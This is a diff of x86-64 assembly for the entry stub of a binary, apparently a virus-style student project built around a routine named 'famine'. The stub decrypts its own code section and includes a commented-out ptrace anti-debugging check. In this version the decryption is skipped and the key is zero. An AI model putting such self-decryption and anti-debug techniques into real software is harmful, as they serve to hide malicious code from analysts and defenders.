@@ -4,6 +4,8 @@ section .text
 	global	_start
 	extern	famine
 
+;fork
+
 ; _ptrace:
 ; 	; ptrace(PTRACE_TRACEME, 0, 0, 0)
 ;     xor rdi, rdi          ; rdi = 0 (PTRACE_TRACEME = 0)
@@ -43,30 +45,19 @@ _start:
     push    r9
     push    r8
 
-	;si je suis l'original
 	jmp NEAR decrypt_done
-    ; 0x55555555a1cc
-
-    ; Adresse de début : famine
     lea r8, [rel famine]             ; Adresse de début (famine)
-
-    ; Adresse de fin : _start
     lea r9, [rel _start]       ; Adresse de fin (_start)
-
-    ; Clé de décryptage
     mov r10, 0x00000000      ; Exemple de clé 64 bits
 
 decrypt_loop:
-    ; Vérifier si on a atteint la fin
     mov rax, r9
     sub rax, r8
     cmp rax, 8
     jl decrypt_done                 ; Si r9 - r8 < 8, fin du décryptage
 
-    ; Charger un bloc de 8 octets à partir de l'adresse actuelle
     mov	r12, [r8]                    ; Charger le bloc chiffré dans r12
 
-    ; Début de la routine de décryptage
     mov r14d, r12d                   ; right = partie basse du bloc
     shr r12, 32                      ; Décaler pour obtenir la partie haute
     mov r13d, r12d                   ; left = partie haute du bloc
@@ -97,21 +88,6 @@ reverse_rounds:
     or r14, r13                      ; Fusionner left et right
     mov [r8], r14                    ; Stocker le bloc déchiffré dans la mémoire
 
-    push	0x0a2e2e2e	;	...\n   
-	push	0x59444f4f	;	OODY
-	push	0x572e2e2e	;	...W
-
-	;	write(stderr, "...WOODY...\n", 20)
-	mov		rax, 1		;	syscall number
-	mov		rdi, 1		;	stderr
-	mov		rsi, rsp	;	"...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
-	mov		rdx, 20		;	20
-	syscall
-
-	;	Clear la stack pour pas avoir de problemes
-	pop	rax
-	pop	rax
-	pop	rax
 
     ; Passer au bloc suivant (8 octets)
     add r8, 8
@@ -119,7 +95,6 @@ reverse_rounds:
 
 decrypt_done:
 	call	famine	
-
 
     pop     r8
     pop     r9
